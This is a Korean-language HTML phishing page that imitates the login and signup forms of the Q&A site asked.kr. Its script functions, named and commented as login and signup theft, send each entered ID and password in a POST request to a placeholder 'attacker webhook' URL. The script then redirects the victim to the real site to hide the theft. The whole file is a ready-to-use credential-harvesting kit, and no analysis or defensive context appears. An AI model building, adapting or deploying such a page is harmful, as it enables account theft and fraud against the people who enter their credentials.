<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>에스크</title>
  <style>
    * { box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; margin: 0; padding: 0; }
    body { background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .wrapper { width: 360px; padding: 20px; }
    .logo { font-weight: bold; font-size: 20px; margin-bottom: 30px; }
    label { display: block; font-weight: bold; margin-bottom: 6px; font-size: 15px; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px; margin-bottom: 18px;
      border-radius: 10px; border: 1px solid #ddd; font-size: 15px;
    }
    .login-btn, .signup-btn {
      width: 100%; padding: 14px; font-weight: bold; font-size: 15px;
      border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;
    }
    .login-btn { background-color: #8bd3ff; color: white; }
    .signup-btn { background-color: #1da1f2; color: white; }
    .toggle { text-align: center; font-size: 13px; color: #aaa; }
    .toggle a { color: #1da1f2; text-decoration: none; }
    .toggle a:hover { text-decoration: underline; }
    #signup-wrapper { display: none; }
  </style>
</head>
<body>
  <div class="wrapper">
    <!-- 로그인 화면 -->
    <div id="login-wrapper">
      <div class="logo">로그인</div>
      <form onsubmit="stealLogin(event)">
        <label for="username">아이디</label>
        <input id="username" type="text" required placeholder="아이디 입력">
        <label for="password">비밀번호</label>
        <input id="password" type="password" required placeholder="비밀번호 입력">
        <button type="submit" class="login-btn">로그인</button>
      </form>
      <div class="toggle">아직 계정이 없으신가요? <a href="#" id="to-signup">회원가입</a></div>
    </div>

    <!-- 회원가입 화면 -->
    <div id="signup-wrapper">
      <div class="logo">회원가입</div>
      <form onsubmit="stealSignup(event)">
        <label for="new-username">아이디</label>
        <input id="new-username" type="text" required placeholder="새 아이디 입력">
        <label for="new-password">비밀번호</label>
        <input id="new-password" type="password" required placeholder="새 비밀번호 입력">
        <button type="submit" class="signup-btn">회원가입</button>
      </form>
      <div class="toggle">이미 계정이 있으신가요? <a href="#" id="to-login">로그인</a></div>
    </div>
  </div>

<script>
  // 페이지 전환
  document.getElementById("to-signup").addEventListener("click", e => {
    e.preventDefault();
    document.getElementById("login-wrapper").style.display = "none";
    document.getElementById("signup-wrapper").style.display = "block";
  });
  document.getElementById("to-login").addEventListener("click", e => {
    e.preventDefault();
    document.getElementById("signup-wrapper").style.display = "none";
    document.getElementById("login-wrapper").style.display = "block";
  });

  // 로그인 탈취
  function stealLogin(e) {
    e.preventDefault();
    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;
    fetch("https://공격자-웹훅", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `로그인 시도\nID: ${u}\nPW: ${p}` })
    }).then(() => {
      window.location.href = "https://asked.kr";
    });
  }

  // 회원가입 탈취
  function stealSignup(e) {
    e.preventDefault();
    const u = document.getElementById("new-username").value;
    const p = document.getElementById("new-password").value;
    fetch("https://공격자-웹훅", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `회원가입 시도\nID: ${u}\nPW: ${p}` })
    }).then(() => {
      window.location.href = "https://asked.kr/signup";
    });
  }
</script>
</body>
</html>
